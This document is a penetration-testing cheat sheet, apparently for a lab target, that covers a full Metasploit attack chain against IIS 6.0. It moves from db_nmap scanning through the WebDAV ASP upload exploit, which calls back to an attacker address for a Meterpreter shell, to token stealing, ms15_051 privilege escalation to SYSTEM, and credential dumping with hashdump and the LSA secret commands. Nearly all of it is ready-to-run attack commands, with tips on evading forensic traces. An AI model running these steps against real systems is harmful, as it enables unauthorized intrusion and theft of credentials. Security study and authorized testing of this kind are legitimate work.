## Reconnaissance and Target Identification

[MODE: methodology]

1. Execute scan within msfconsole to enable internal data tracking.
2. Review identified hosts and services to determine the attack surface.
3. Analyze service versions for known vulnerabilities like CVE-2017-7269 on IIS 6.0.

---

### MSF Database Discovery

When to use: Conducting initial enumeration and need to store results in the Metasploit database for session tracking.

Scan the target and save results to the DB

```
db_nmap -sV -p- -T5 -A <TARGET_IP>
```

List all discovered hosts in the current workspace

```
hosts
```

List all discovered services and associated ports

```
services
```

---

## WebDAV Exploitation and Shell Gain

[MODE: methodology]

1. Search for modules matching the identified service and version.
2. Configure mandatory parameters, specifically listener and target addresses.
3. Execute the exploit and monitor for the automated transition to a Meterpreter stage.

---

### IIS WebDAV Upload

When to use: Target is running Microsoft IIS 6.0 with WebDAV write access enabled.

Search for the WebDAV upload exploit module

```
search iis_webdav_upload_asp
```

Configure and launch the exploit

```
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS <TARGET_IP>
set LHOST <ATTACK_IP>
run
```

**Gotchas** **Manual cleanup required** as the automated deletion of the uploaded `.asp` payload frequently fails due to 403 Forbidden errors, leaving forensic signatures on disk,.

---

## Process Migration and Token Impersonation

[MODE: methodology]

1. Attempt `getuid` to verify current privileges.
2. If access is denied or privileges are insufficient, list running processes to identify targets.
3. Steal a token from a process running under a more useful service account.

---

### Token Stealing

When to use: `getuid` returns **Access is denied** or you lack permissions to read sensitive directories like `AdminScripts`,.

List all running processes including PIDs, users, and architectures

```
ps
```

Impersonate the security token of a specific process ID

```
steal_token <PID>
```

> ⚠️ Gap: The source does not specify the requirements for stealing tokens from processes owned by other users, which typically requires `SeDebugPrivilege` or similar high-level rights.

**Gotchas** **Insufficient permissions** will prevent reading process lists or stealing tokens if the initial exploit lands in a highly restricted sandbox.

---

## Local Privilege Escalation

[MODE: methodology]

1. Background the current low-privileged session.
2. Run the local exploit suggester against the session index.
3. Select and execute a suggested exploit to obtain SYSTEM access.

---

### Enumeration and Escalation

When to use: Currently holding a low-privilege session and need to identify kernel or service-level vulnerabilities for SYSTEM access,.

Background the current session to return to msfconsole

```
bg
```

Identify potential local vulnerabilities for a specific session

```
use post/multi/recon/local_exploit_suggester
set SESSION <SESSION_ID>
run
```

Execute the ms15_051 elevation exploit

```
use exploit/windows/local/ms15_051_client_copy_image
set SESSION <SESSION_ID>
set LHOST <ATTACK_IP>
run
```

**Edge cases** Exploits like `ms15_051` may launch a secondary process like `notepad.exe` to host the reflectively injected DLL, which can be a detection trigger.

---

## Credential Harvesting

[MODE: methodology]

1. Verify SYSTEM status after successful elevation.
2. Extract local NTLM hashes for offline cracking.
3. Dump LSA secrets and SAM database information for further lateral movement,.

---

### Hash and Secret Extraction

When to use: SYSTEM access is achieved and local credentials or service passwords are required for pivoting or persistence,.

Dump the SAM database for local user NTLM hashes

```
hashdump
```

Dump SAM domain and RID information directly from LSA

```
lsa_dump_sam
```

Extract LSA secrets including service account passwords and DPAPI keys

```
lsa_dump_secrets
```

**Gotchas** **Lack of SYSTEM privileges** will cause these commands to fail, as they require direct memory access to sensitive OS components,.